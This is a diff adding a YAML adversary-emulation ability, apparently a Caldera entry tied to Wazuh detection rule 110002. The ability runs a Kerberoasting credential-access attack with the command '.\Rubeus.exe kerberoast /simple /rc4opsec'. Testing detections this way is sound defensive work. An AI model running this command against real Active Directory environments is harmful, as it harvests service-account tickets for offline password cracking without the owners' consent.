@@ -1,0 +1,17 @@
+- requirements: []
+  name: '[CORP] [Wazuh] [110002] Kerberoasting utilizando Rubeus'
+  description: Executa ataque de Kerberoasting solicitando TGS para contas com SPN
+    configurado, visando quebra de senha offline.
+  tactic: credential-access
+  technique_id: T1558.003
+  technique_name: 'Steal or Forge Kerberos Tickets: Kerberoasting'
+  executors:
+  - cleanup: []
+    timeout: 60
+    platform: windows
+    name: psh
+    payloads:
+    - Rubeus.exe
+    parsers: []
+    command: .\Rubeus.exe kerberoast /simple /rc4opsec
+  id: d34c2fa6-0093-42a3-9626-3917124628c3
